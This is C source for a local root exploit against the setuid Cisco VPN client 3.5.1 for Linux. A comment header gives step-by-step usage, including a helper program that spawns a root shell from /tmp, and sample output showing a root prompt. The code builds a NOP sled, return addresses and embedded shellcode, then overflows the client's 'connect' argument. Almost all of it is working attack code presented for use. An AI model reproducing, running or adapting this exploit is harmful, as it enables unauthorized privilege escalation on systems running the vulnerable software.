/* buffer overflow for cisco's vpnclient for linux
   tested against the latest release: vpnclient-linux-3.5.1.Rel-k9.tar.gz

   to get this to properly work, you need to put the following code into
   xx.c, compile it (as xx), and place the executable into /tmp (to bypass
   tight PAM restrictions)

   #include <stdio.h>
   main() {
     setuid(0);
     execl("/bin/sh", "sh", NULL);
   }

   then compile this and run it. syntax is ./vpnclient <offset>
   tested under gentoo linux and debian:
   $ ls -la `which vpnclient`
   -rws--x--x    1 root   root   160900 Apr 13 22:34 /usr/local/bin/vpnclient
   $ ./vpnKILLient 
   addr: 0xbffffbac, offset: 0
   Cisco Systems VPN Client Version 3.5.1 (Rel)
   Copyright (C) 1998-2002 Cisco Systems, Inc. All Rights Reserved.
   Client Type(s): Linux
   Running on: Linux 2.4.17 #1 Sat Apr 13 21:53:52 EDT 2002 i686

   sh-2.05a# id
   uid=0(root) gid=100(users) groups=100(users),10(wheel)

   greetz: all of the angrypacket crew (of course)
           shok  -> pheerable^2;
           vegac -> 31336++;

   when you get a chance, check out http://sec.angrypacket.com
*/

#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define NOP 0x90
#define LEN 620 /* 520 to own eip */

/* shellcode by vegac (setuid(0)->/tmp/xx) */
/* wont work if your /tmp partition is mounted noexec or nosuid */
char shell[]=
        "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
        "\x31\xc0\x50\x68\x2f\x2f\x78\x78"
        "\x68\x2f\x74\x6d\x70\x89\xe3\x31"
        "\xc0\x50\x89\xe2\x54\x89\xe1\xb0"
        "\x0b\xcd\x80\x00";

unsigned long get_sp (void) {
	__asm__("mov %esp,%eax");
}
int main(int argc, char *argv[]) {

	int i, offset=0;
	long addr;
	char *buf, *ptr;

	if(argc > 1) offset = atoi(argv[1]);

	buf = (char *)malloc(sizeof(char) * LEN);
	bzero(buf, LEN);
	addr = get_sp() - offset;
	printf("addr: 0x%x, offset: %d\n", addr, offset);

	for(i = 0; i < LEN; i += 4) {
		*(long *)&buf[i] = addr;
	}

	for(i = 0; i < (LEN / 2); i++) {
		*(buf + i) = NOP;
	}

	ptr = buf + ((LEN / 2) - (strlen(shell) / 2));
	for(i = 0; i < strlen(shell); i++) {
		*(ptr++) = shell[i];
	}
	buf[LEN - 1] = '\0';

	execl("/usr/local/bin/vpnclient", "vpnclient", "connect", buf, 0);
	return(0);

}
